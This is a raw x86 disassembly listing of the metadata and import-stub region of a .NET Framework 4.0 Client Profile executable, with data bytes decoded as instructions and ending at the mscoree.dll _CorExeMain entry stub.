  40c111:	2c 56                	sub    $0x56,%al
  40c113:	65 72 73             	gs jb  0x40c189
  40c116:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40c11d:	30 2c 50             	xor    %ch,(%eax,%edx,2)
  40c120:	72 6f                	jb     0x40c191
  40c122:	66 69 6c 65 3d 43 6c 	imul   $0x6c43,0x3d(%ebp,%eiz,2),%bp
  40c129:	69 65 6e 74 01 00 54 	imul   $0x54000174,0x6e(%ebp),%esp
  40c130:	0e                   	push   %cs
  40c131:	14 46                	adc    $0x46,%al
  40c133:	72 61                	jb     0x40c196
  40c135:	6d                   	insl   (%dx),%es:(%edi)
  40c136:	65 77 6f             	gs ja  0x40c1a8
  40c139:	72 6b                	jb     0x40c1a6
  40c13b:	44                   	inc    %esp
  40c13c:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40c143:	61                   	popa
  40c144:	6d                   	insl   (%dx),%es:(%edi)
  40c145:	65 1f                	gs pop %ds
  40c147:	2e 4e                	cs dec %esi
  40c149:	45                   	inc    %ebp
  40c14a:	54                   	push   %esp
  40c14b:	20 46 72             	and    %al,0x72(%esi)
  40c14e:	61                   	popa
  40c14f:	6d                   	insl   (%dx),%es:(%edi)
  40c150:	65 77 6f             	gs ja  0x40c1c2
  40c153:	72 6b                	jb     0x40c1c0
  40c155:	20 34 20             	and    %dh,(%eax,%eiz,1)
  40c158:	43                   	inc    %ebx
  40c159:	6c                   	insb   (%dx),%es:(%edi)
  40c15a:	69 65 6e 74 20 50 72 	imul   $0x72502074,0x6e(%ebp),%esp
  40c161:	6f                   	outsl  %ds:(%esi),(%dx)
  40c162:	66 69 6c 65 09 01 00 	imul   $0x1,0x9(%ebp,%eiz,2),%bp
  40c169:	04 49                	add    $0x49,%al
  40c16b:	74 65                	je     0x40c1d2
  40c16d:	6d                   	insl   (%dx),%es:(%edi)
  40c16e:	00 00                	add    %al,(%eax)
  40c170:	03 07                	add    (%edi),%eax
  40c172:	01 08                	add    %ecx,(%eax)
  40c174:	04 00                	add    $0x0,%al
  40c176:	01 08                	add    %ecx,(%eax)
  40c178:	0e                   	push   %cs
  40c179:	03 07                	add    (%edi),%eax
  40c17b:	01 02                	add    %eax,(%edx)
  40c17d:	05 00 00 12 80       	add    $0x80120000,%eax
  40c182:	b1 05                	mov    $0x5,%cl
  40c184:	20 01                	and    %al,(%ecx)
  40c186:	0e                   	push   %cs
  40c187:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40c18c:	12 80 b5 05 20 00    	adc    0x2005b5(%eax),%al
  40c192:	12 80 b9 05 20 01    	adc    0x12005b9(%eax),%al
  40c198:	1d 05 0e 08 20       	sbb    $0x20080e05,%eax
  40c19d:	03 02                	add    (%edx),%eax
  40c19f:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  40c1a4:	14 07                	adc    $0x7,%al
  40c1a6:	08 0e                	or     %cl,(%esi)
  40c1a8:	08 1d 12 80 c9 08    	or     %bl,0x8c98012
  40c1ae:	12 80 c9 12 80 cd    	adc    -0x327fed37(%eax),%al
  40c1b4:	12 80 d1 1d 0e 0c    	adc    0xc0e1dd1(%eax),%al
  40c1ba:	20 03                	and    %al,(%ebx)
  40c1bc:	01 11                	add    %edx,(%ecx)
  40c1be:	80 d5 11             	adc    $0x11,%ch
  40c1c1:	80 d9 11             	sbb    $0x11,%cl
  40c1c4:	80 dd 05             	sbb    $0x5,%ch
  40c1c7:	00 02                	add    %al,(%edx)
  40c1c9:	02 0e                	add    (%esi),%cl
  40c1cb:	0e                   	push   %cs
  40c1cc:	06                   	push   %es
  40c1cd:	20 01                	and    %al,(%ecx)
  40c1cf:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  40c1d4:	20 01                	and    %al,(%ecx)
  40c1d6:	08 08                	or     %cl,(%eax)
  40c1d8:	07                   	pop    %es
  40c1d9:	00 01                	add    %al,(%ecx)
  40c1db:	1d 12 80 c9 0e       	sbb    $0xec98012,%eax
  40c1e0:	07                   	pop    %es
  40c1e1:	20 02                	and    %al,(%edx)
  40c1e3:	01 12                	add    %edx,(%edx)
  40c1e5:	80 c9 08             	or     $0x8,%cl
  40c1e8:	06                   	push   %es
  40c1e9:	20 01                	and    %al,(%ecx)
  40c1eb:	01 12                	add    %edx,(%edx)
  40c1ed:	80 f1 09             	xor    $0x9,%cl
  40c1f0:	20 02                	and    %al,(%edx)
  40c1f2:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  40c1f7:	80 f5 05             	xor    $0x5,%ch
  40c1fa:	20 02                	and    %al,(%edx)
  40c1fc:	08 08                	or     %cl,(%eax)
  40c1fe:	08 06                	or     %al,(%esi)
  40c200:	20 02                	and    %al,(%edx)
  40c202:	01 12                	add    %edx,(%edx)
  40c204:	0d 02 05 20 02       	or     $0x2200502,%eax
  40c209:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40c20c:	09 20                	or     %esp,(%eax)
  40c20e:	03 01                	add    (%ecx),%eax
  40c210:	12 61 02             	adc    0x2(%ecx),%ah
  40c213:	12 81 01 05 20 00    	adc    0x200501(%ecx),%al
  40c219:	12 81 05 0b 20 04    	adc    0x4200b05(%ecx),%al
  40c21f:	01 0e                	add    %ecx,(%esi)
  40c221:	12 81 09 11 81 0d    	adc    0xd811109(%ecx),%al
  40c227:	02 09                	add    (%ecx),%cl
  40c229:	20 04 01             	and    %al,(%ecx,%eax,1)
  40c22c:	12 81 15 1c 08 08    	adc    0x8081c15(%ecx),%al
  40c232:	0c 20                	or     $0x20,%al
  40c234:	05 12 25 1d 05       	add    $0x51d2512,%eax
  40c239:	08 08                	or     %cl,(%eax)
  40c23b:	12 81 19 1c 06 00    	adc    0x61c19(%ecx),%al
  40c241:	01 11                	add    %edx,(%ecx)
  40c243:	81 21 0e 05 20 01    	andl   $0x120050e,(%ecx)
  40c249:	02 12                	add    (%edx),%dl
  40c24b:	19 04 07             	sbb    %eax,(%edi,%eax,1)
  40c24e:	02 08                	add    (%eax),%cl
  40c250:	08 05 20 01 08 12    	or     %al,0x12080120
  40c256:	25 06 00 02 08       	and    $0x8020006,%eax
  40c25b:	1d 05 08 07 20       	sbb    $0x20070805,%eax
  40c260:	03 08                	add    (%eax),%ecx
  40c262:	1d 05 08 08 06       	sbb    $0x6080805,%eax
  40c267:	20 01                	and    %al,(%ecx)
  40c269:	01 12                	add    %edx,(%edx)
  40c26b:	81 29 04 20 01 01    	subl   $0x1012004,(%ecx)
  40c271:	1c 0c                	sbb    $0xc,%al
  40c273:	07                   	pop    %es
  40c274:	06                   	push   %es
  40c275:	1c 02                	sbb    $0x2,%al
  40c277:	1d 05 12 81 2d       	sbb    $0x2d811205,%eax
  40c27c:	08 1d 05 06 00 02    	or     %bl,0x2000605
  40c282:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40c285:	02 07                	add    (%edi),%al
  40c287:	20 02                	and    %al,(%edx)
  40c289:	02 08                	add    (%eax),%cl
  40c28b:	11 81 35 07 20 03    	adc    %eax,0x3200735(%ecx)
  40c291:	01 1d 05 08 08 1a    	add    %ebx,0x1a080805
  40c297:	07                   	pop    %es
  40c298:	0a 12                	or     (%edx),%dl
  40c29a:	81 3d 0e 1d 12 81 41 	cmpl   $0x81120841,0x81121d0e
  40c2a1:	08 12 81 
  40c2a4:	41                   	inc    %ecx
  40c2a5:	12 81 45 12 81 49    	adc    0x49811245(%ecx),%al
  40c2ab:	1d 05 0e 12 81       	sbb    $0x81120e05,%eax
  40c2b0:	4d                   	dec    %ebp
  40c2b1:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40c2b6:	0e                   	push   %cs
  40c2b7:	05 00 00 12 81       	add    $0x81120000,%eax
  40c2bc:	41                   	inc    %ecx
  40c2bd:	05 20 00 12 81       	add    $0x81120020,%eax
  40c2c2:	55                   	push   %ebp
  40c2c3:	06                   	push   %es
  40c2c4:	00 00                	add    %al,(%eax)
  40c2c6:	1d 12 81 41 05       	sbb    $0x5418112,%eax
  40c2cb:	00 01                	add    %al,(%ecx)
  40c2cd:	0e                   	push   %cs
  40c2ce:	1d 0e 06 20 01       	sbb    $0x120060e,%eax
  40c2d3:	01 11                	add    %edx,(%ecx)
  40c2d5:	81 5d 08 00 01 12 81 	sbbl   $0x81120100,0x8(%ebp)
  40c2dc:	41                   	inc    %ecx
  40c2dd:	12 81 45 04 06 12    	adc    0x12060445(%ecx),%al
  40c2e3:	81 49 09 20 02 12 81 	orl    $0x81120220,0x9(%ecx)
  40c2ea:	49                   	dec    %ecx
  40c2eb:	0e                   	push   %cs
  40c2ec:	11 81 69 06 00 03    	adc    %eax,0x3000669(%ecx)
  40c2f2:	0e                   	push   %cs
  40c2f3:	0e                   	push   %cs
  40c2f4:	0e                   	push   %cs
  40c2f5:	0e                   	push   %cs
  40c2f6:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c2fb:	1c 07                	sbb    $0x7,%al
  40c2fd:	20 02                	and    %al,(%edx)
  40c2ff:	01 0e                	add    %ecx,(%esi)
  40c301:	11 81 75 04 07 02    	adc    %eax,0x2070475(%ecx)
  40c307:	0a 02                	or     (%edx),%al
  40c309:	10 07                	adc    %al,(%edi)
  40c30b:	06                   	push   %es
  40c30c:	12 81 85 12 81 89    	adc    -0x767eed7b(%ecx),%al
  40c312:	12 81 8d 12 81 91    	adc    -0x6e7eed73(%ecx),%al
  40c318:	0e                   	push   %cs
  40c319:	02 05 20 00 12 81    	add    0x81120020,%al
  40c31f:	89 05 20 00 12 81    	mov    %eax,0x81120020
  40c325:	8d 05 20 00 12 81    	lea    0x81120020,%eax
  40c32b:	91                   	xchg   %eax,%ecx
  40c32c:	04 20                	add    $0x20,%al
  40c32e:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40c331:	04 07                	add    $0x7,%al
  40c333:	02 02                	add    (%edx),%al
  40c335:	02 03                	add    (%ebx),%al
  40c337:	20 00                	and    %al,(%eax)
  40c339:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40c33c:	02 18                	add    (%eax),%bl
  40c33e:	02 03                	add    (%ebx),%al
  40c340:	07                   	pop    %es
  40c341:	01 0e                	add    %ecx,(%esi)
  40c343:	05 00 00 12 81       	add    $0x81120000,%eax
  40c348:	9d                   	popf
  40c349:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40c34e:	1c 0a                	sbb    $0xa,%al
  40c350:	07                   	pop    %es
  40c351:	05 1d 05 12 35       	add    $0x3512051d,%eax
  40c356:	1d 05 08 05 05       	sbb    $0x5050805,%eax
  40c35b:	20 01                	and    %al,(%ecx)
  40c35d:	12 35 0e 05 20 02    	adc    0x220050e,%dh
  40c363:	0e                   	push   %cs
  40c364:	08 08                	or     %cl,(%eax)
  40c366:	06                   	push   %es
  40c367:	07                   	pop    %es
  40c368:	02 02                	add    (%edx),%al
  40c36a:	11 81 ad 05 20 02    	adc    %eax,0x22005ad(%ecx)
  40c370:	0e                   	push   %cs
  40c371:	0e                   	push   %cs
  40c372:	0e                   	push   %cs
  40c373:	05 20 00 11 81       	add    $0x81110020,%eax
  40c378:	ad                   	lods   %ds:(%esi),%eax
  40c379:	05 00 00 12 81       	add    $0x81120000,%eax
  40c37e:	b9 06 20 01 01       	mov    $0x1012006,%ecx
  40c383:	12 81 b9 06 20 01    	adc    0x12006b9(%ecx),%al
  40c389:	02 11                	add    (%ecx),%dl
  40c38b:	81 c1 11 07 05 12    	add    $0x12050711,%ecx
  40c391:	81 85 15 12 41 01 0e 	addl   $0x8d81120e,0x1411215(%ebp)
  40c398:	12 81 8d 
  40c39b:	12 81 91 0e 05 15    	adc    0x15050e91(%ecx),%al
  40c3a1:	12 41 01             	adc    0x1(%ecx),%al
  40c3a4:	0e                   	push   %cs
  40c3a5:	05 20 01 01 13       	add    $0x13010120,%eax
  40c3aa:	00 05 20 00 1d 13    	add    %al,0x131d0020
  40c3b0:	00 06                	add    %al,(%esi)
  40c3b2:	00 02                	add    %al,(%edx)
  40c3b4:	0e                   	push   %cs
  40c3b5:	0e                   	push   %cs
  40c3b6:	1d 0e 08 07 03       	sbb    $0x307080e,%eax
  40c3bb:	1d 12 29 08 12       	sbb    $0x12082912,%eax
  40c3c0:	29 05 00 00 1d 12    	sub    %eax,0x121d0000
  40c3c6:	29 05 20 00 11 81    	sub    %eax,0x81110020
  40c3cc:	c5 09                	lds    (%ecx),%ecx
  40c3ce:	00 02                	add    %al,(%edx)
  40c3d0:	02 11                	add    (%ecx),%dl
  40c3d2:	81 c5 11 81 c5 05    	add    $0x5c58111,%ebp
  40c3d8:	07                   	pop    %es
  40c3d9:	02 12                	add    (%edx),%dl
  40c3db:	35 0e 07 20 03       	xor    $0x320070e,%eax
  40c3e0:	01 02                	add    %eax,(%edx)
  40c3e2:	0e                   	push   %cs
  40c3e3:	10 02                	adc    %al,(%edx)
  40c3e5:	06                   	push   %es
  40c3e6:	00 01                	add    %al,(%ecx)
  40c3e8:	01 12                	add    %edx,(%edx)
  40c3ea:	81 cd 06 07 02 12    	or     $0x12020706,%ebp
  40c3f0:	81 49 02 08 20 03 01 	orl    $0x1032008,0x2(%ecx)
  40c3f7:	0e                   	push   %cs
  40c3f8:	1c 11                	sbb    $0x11,%al
  40c3fa:	81 d5 07 07 02 12    	adc    $0x12020707,%ebp
  40c400:	81 49 1d 05 06 20 01 	orl    $0x1200605,0x1d(%ecx)
  40c407:	12 81 49 0e 02 1d    	adc    0x1d020e49(%ecx),%al
  40c40d:	05 07 20 02 12       	add    $0x12022007,%eax
  40c412:	81 49 0e 02 0e 07 04 	orl    $0x4070e02,0xe(%ecx)
  40c419:	12 60 0e             	adc    0xe(%eax),%ah
  40c41c:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40c421:	12 60 12             	adc    0x12(%eax),%ah
  40c424:	60                   	pusha
  40c425:	06                   	push   %es
  40c426:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c42b:	60                   	pusha
  40c42c:	10 10                	adc    %dl,(%eax)
  40c42e:	01 01                	add    %eax,(%ecx)
  40c430:	15 12 41 01 1e       	adc    $0x1e014112,%eax
  40c435:	00 15 12 81 e1 01    	add    %dl,0x1e18112
  40c43b:	1e                   	push   %ds
  40c43c:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c43f:	01 12                	add    %edx,(%edx)
  40c441:	60                   	pusha
  40c442:	09 20                	or     %esp,(%eax)
  40c444:	00 15 11 81 d9 01    	add    %dl,0x1d98111
  40c44a:	13 00                	adc    (%eax),%eax
  40c44c:	07                   	pop    %es
  40c44d:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40c452:	12 60 04             	adc    0x4(%eax),%ah
  40c455:	20 00                	and    %al,(%eax)
  40c457:	13 00                	adc    (%eax),%eax
  40c459:	05 20 01 02 13       	add    $0x13020120,%eax
  40c45e:	00 03                	add    %al,(%ebx)
  40c460:	07                   	pop    %es
  40c461:	01 1c 05 00 00 12 81 	add    %ebx,-0x7eee0000(,%eax,1)
  40c468:	e5 07                	in     $0x7,%eax
  40c46a:	20 01                	and    %al,(%ecx)
  40c46c:	12 81 e9 1d 05 06    	adc    0x6051de9(%ecx),%al
  40c472:	20 01                	and    %al,(%ecx)
  40c474:	12 81 ed 0e 06 00    	adc    0x60eed(%ecx),%al
  40c47a:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40c47d:	81 ed 08 00 01 12    	sub    $0x12010008,%ebp
  40c483:	81 ed 11 81 f5 09    	sub    $0x9f58111,%ebp
  40c489:	00 02                	add    %al,(%edx)
  40c48b:	12 81 f9 11 81 fd    	adc    -0x27eee07(%ecx),%al
  40c491:	0e                   	push   %cs
  40c492:	1c 00                	sbb    $0x0,%al
  40c494:	05 12 82 05 11       	add    $0x11058212,%eax
  40c499:	82 09 0e             	orb    $0xe,(%ecx)
  40c49c:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40c4a1:	12 81 ed 12 81 ed    	adc    -0x127eed13(%ecx),%al
  40c4a7:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40c4ac:	12 81 f9 17 15 12    	adc    0x121517f9(%ecx),%al
  40c4b2:	45                   	inc    %ebp
  40c4b3:	01 15 12 49 0a 12    	add    %edx,0x120a4912
  40c4b9:	4d                   	dec    %ebp
  40c4ba:	1c 12                	sbb    $0x12,%al
  40c4bc:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40c4c1:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c4c6:	0e                   	push   %cs
  40c4c7:	0b 00                	or     (%eax),%eax
  40c4c9:	01 15 12 45 01 13    	add    %edx,0x13014512
  40c4cf:	00 12                	add    %dl,(%edx)
  40c4d1:	82 05 03 06 13 00 13 	addb   $0x13,0x130603
  40c4d8:	15 12 49 0a 12       	adc    $0x120a4912,%eax
  40c4dd:	4d                   	dec    %ebp
  40c4de:	1c 12                	sbb    $0x12,%al
  40c4e0:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40c4e5:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c4ea:	0e                   	push   %cs
  40c4eb:	17                   	pop    %ss
  40c4ec:	20 0a                	and    %cl,(%edx)
  40c4ee:	01 13                	add    %edx,(%ebx)
  40c4f0:	00 13                	add    %dl,(%ebx)
  40c4f2:	01 13                	add    %edx,(%ebx)
  40c4f4:	02 13                	add    (%ebx),%dl
  40c4f6:	03 13                	add    (%ebx),%edx
  40c4f8:	04 13                	add    $0x13,%al
  40c4fa:	05 13 06 13 07       	add    $0x7130613,%eax
  40c4ff:	13 08                	adc    (%eax),%ecx
  40c501:	13 09                	adc    (%ecx),%ecx
  40c503:	05 07 01 12 82       	add    $0x82120107,%eax
  40c508:	0d 07 20 03 01       	or     $0x1032007,%eax
  40c50d:	0e                   	push   %cs
  40c50e:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  40c513:	01 1d 05 08 12 07    	add    %ebx,0x7120805
  40c519:	06                   	push   %es
  40c51a:	12 81 2d 12 82 19    	adc    0x1982122d(%ecx),%al
  40c520:	12 82 1d 12 82 21    	adc    0x2182121d(%edx),%al
  40c526:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40c52b:	20 01                	and    %al,(%ecx)
  40c52d:	01 11                	add    %edx,(%ecx)
  40c52f:	82 2d 06 20 01 01 11 	subb   $0x11,0x1012006
  40c536:	82 31 05             	xorb   $0x5,(%ecx)
  40c539:	20 00                	and    %al,(%eax)
  40c53b:	12 82 35 0b 20 03    	adc    0x3200b35(%edx),%al
  40c541:	01 12                	add    %edx,(%edx)
  40c543:	61                   	popa
  40c544:	12 82 35 11 82 39    	adc    0x39821135(%edx),%al
  40c54a:	08 20                	or     %ah,(%eax)
  40c54c:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  40c552:	08 1a                	or     %bl,(%edx)
  40c554:	07                   	pop    %es
  40c555:	0a 12                	or     (%edx),%dl
  40c557:	81 2d 12 82 19 12 82 	subl   $0x51d2182,0x12198212
  40c55e:	21 1d 05 
  40c561:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40c566:	82 1d 1d 05 1d 05 1d 	sbbb   $0x1d,0x51d051d
  40c56d:	05 0c 00 05 01       	add    $0x105000c,%eax
  40c572:	12 82 45 08 12 82    	adc    -0x7dedf7bb(%edx),%al
  40c578:	45                   	inc    %ebp
  40c579:	08 08                	or     %cl,(%eax)
  40c57b:	04 07                	add    $0x7,%al
  40c57d:	02 02                	add    (%edx),%al
  40c57f:	08 09                	or     %cl,(%ecx)
  40c581:	00 02                	add    %al,(%edx)
  40c583:	01 12                	add    %edx,(%edx)
  40c585:	82 45 11 82          	addb   $0x82,0x11(%ebp)
  40c589:	4d                   	dec    %ebp
  40c58a:	0d 07 06 1d 05       	or     $0x51d0607,%eax
  40c58f:	12 82 51 12 35 1d    	adc    0x1d351251(%edx),%al
  40c595:	05 08 05 07 07       	add    $0x7070508,%eax
  40c59a:	02 12                	add    (%edx),%dl
  40c59c:	82 51 1d 05          	adcb   $0x5,0x1d(%ecx)
  40c5a0:	08 07                	or     %al,(%edi)
  40c5a2:	04 12                	add    $0x12,%al
  40c5a4:	35 1d 05 08 05       	xor    $0x508051d,%eax
  40c5a9:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40c5ae:	1c 06                	sbb    $0x6,%al
  40c5b0:	07                   	pop    %es
  40c5b1:	03 1d 05 08 08 05    	add    0x5080805,%ebx
  40c5b7:	20 01                	and    %al,(%ecx)
  40c5b9:	13 00                	adc    (%eax),%eax
  40c5bb:	08 04 07             	or     %al,(%edi,%eax,1)
  40c5be:	01 12                	add    %edx,(%edx)
  40c5c0:	60                   	pusha
  40c5c1:	0e                   	push   %cs
  40c5c2:	07                   	pop    %es
  40c5c3:	05 08 08 0e 15       	add    $0x150e0808,%eax
  40c5c8:	11 81 d9 01 12 60    	adc    %eax,0x601201d9(%ecx)
  40c5ce:	12 60 07             	adc    0x7(%eax),%ah
  40c5d1:	07                   	pop    %es
  40c5d2:	04 08                	add    $0x8,%al
  40c5d4:	05 1d 05 08 04       	add    $0x408051d,%eax
  40c5d9:	20 01                	and    %al,(%ecx)
  40c5db:	01 05 04 07 01 11    	add    %eax,0x11010704
  40c5e1:	64 04 00             	fs add $0x0,%al
  40c5e4:	01 0b                	add    %ecx,(%ebx)
  40c5e6:	0a 04 00             	or     (%eax,%eax,1),%al
  40c5e9:	01 0b                	add    %ecx,(%ebx)
  40c5eb:	0e                   	push   %cs
  40c5ec:	04 00                	add    $0x0,%al
  40c5ee:	01 0b                	add    %ecx,(%ebx)
  40c5f0:	0d 04 00 01 0b       	or     $0xb010004,%eax
  40c5f5:	0c 06                	or     $0x6,%al
  40c5f7:	00 01                	add    %al,(%ecx)
  40c5f9:	0b 11                	or     (%ecx),%edx
  40c5fb:	81 ad 04 00 01 0a 0a 	subl   $0x100040a,0xa010004(%ebp)
  40c602:	04 00 01 
  40c605:	0a 0e                	or     (%esi),%cl
  40c607:	04 00                	add    $0x0,%al
  40c609:	01 0a                	add    %ecx,(%edx)
  40c60b:	0d 04 00 01 0a       	or     $0xa010004,%eax
  40c610:	0c 06                	or     $0x6,%al
  40c612:	00 01                	add    %al,(%ecx)
  40c614:	0a 11                	or     (%ecx),%dl
  40c616:	81 ad 04 00 01 0d 0a 	subl   $0x100040a,0xd010004(%ebp)
  40c61d:	04 00 01 
  40c620:	0d 0e 07 07 02       	or     $0x207070e,%eax
  40c625:	11 64 11 81          	adc    %esp,-0x7f(%ecx,%edx,1)
  40c629:	ad                   	lods   %ds:(%esi),%eax
  40c62a:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40c62f:	0c 07                	or     $0x7,%al
  40c631:	07                   	pop    %es
  40c632:	02 1d 05 12 81 71    	add    0x71811205,%bl
  40c638:	0d 20 04 01 0e       	or     $0xe010420,%eax
  40c63d:	11 81 75 11 82 61    	adc    %eax,0x61821175(%ecx)
  40c643:	11 82 65 0b 07 06    	adc    %eax,0x6070b65(%edx)
  40c649:	12 60 1d             	adc    0x1d(%eax),%ah
  40c64c:	0e                   	push   %cs
  40c64d:	0e                   	push   %cs
  40c64e:	08 12                	or     %dl,(%edx)
  40c650:	60                   	pusha
  40c651:	08 05 07 01 12 81    	or     %al,0x81120107
  40c657:	2d 05 07 01 12       	sub    $0x12010705,%eax
  40c65c:	81 71 07 07 04 05 1d 	xorl   $0x1d050407,0x7(%ecx)
  40c663:	05 08 08 06 00       	add    $0x60808,%eax
  40c668:	02 07                	add    (%edi),%al
  40c66a:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c66f:	02 0c 1d 05 08 06 00 	add    0x60805(,%ebx,1),%cl
  40c676:	02 0d 1d 05 08 06    	add    0x608051d,%cl
  40c67c:	00 02                	add    %al,(%edx)
  40c67e:	09 1d 05 08 06 00    	or     %ebx,0x60805
  40c684:	02 0b                	add    (%ebx),%cl
  40c686:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c68b:	02 06                	add    (%esi),%al
  40c68d:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c692:	02 0a                	add    (%edx),%cl
  40c694:	1d 05 08 09 07       	sbb    $0x7090805,%eax
  40c699:	03 12                	add    (%edx),%edx
  40c69b:	81 2d 1d 05 1d 05 05 	subl   $0x12020705,0x51d051d
  40c6a2:	07 02 12 
  40c6a5:	60                   	pusha
  40c6a6:	02 04 07             	add    (%edi,%eax,1),%al
  40c6a9:	01 1d 05 05 07 02    	add    %ebx,0x2070505
  40c6af:	1d 05 08 08 07       	sbb    $0x7080805,%eax
  40c6b4:	04 1d                	add    $0x1d,%al
  40c6b6:	05 1d 05 08 05       	add    $0x508051d,%eax
  40c6bb:	06                   	push   %es
  40c6bc:	07                   	pop    %es
  40c6bd:	03 1d 05 08 05 05    	add    0x5050805,%ebx
  40c6c3:	00 01                	add    %al,(%ecx)
  40c6c5:	1d 05 0b 0f 07       	sbb    $0x70f0b05,%eax
  40c6ca:	06                   	push   %es
  40c6cb:	12 81 2d 1d 05 08    	adc    0x8051d2d(%ecx),%al
  40c6d1:	12 82 69 1d 05 1d    	adc    0x1d051d69(%edx),%al
  40c6d7:	05 08 20 02 01       	add    $0x1022008,%eax
  40c6dc:	12 61 11             	adc    0x11(%ecx),%ah
  40c6df:	82 6d 0c 07          	subb   $0x7,0xc(%ebp)
  40c6e3:	04 12                	add    $0x12,%al
  40c6e5:	81 2d 1d 05 12 82 69 	subl   $0x51d69,0x8212051d
  40c6ec:	1d 05 00 
  40c6ef:	00 18                	add    %bl,(%eax)
  40c6f1:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  40c6f7:	00 00                	add    %al,(%eax)
  40c6f9:	00 00                	add    %al,(%eax)
  40c6fb:	00 2e                	add    %ch,(%esi)
  40c6fd:	c7 00 00 00 20 00    	movl   $0x200000,(%eax)
	...
  40c717:	00 20                	add    %ah,(%eax)
  40c719:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  40c71f:	00 00                	add    %al,(%eax)
  40c721:	00 5f 43             	add    %bl,0x43(%edi)
  40c724:	6f                   	outsl  %ds:(%esi),(%dx)
  40c725:	72 45                	jb     0x40c76c
  40c727:	78 65                	js     0x40c78e
  40c729:	4d                   	dec    %ebp
  40c72a:	61                   	popa
  40c72b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40c732:	72 65                	jb     0x40c799
  40c734:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40c738:	6c                   	insb   (%dx),%es:(%edi)
  40c739:	00 00                	add    %al,(%eax)
  40c73b:	00 00                	add    %al,(%eax)
  40c73d:	00 ff                	add    %bh,%bh
  40c73f:	25 00 20 40 00       	and    $0x402000,%eax
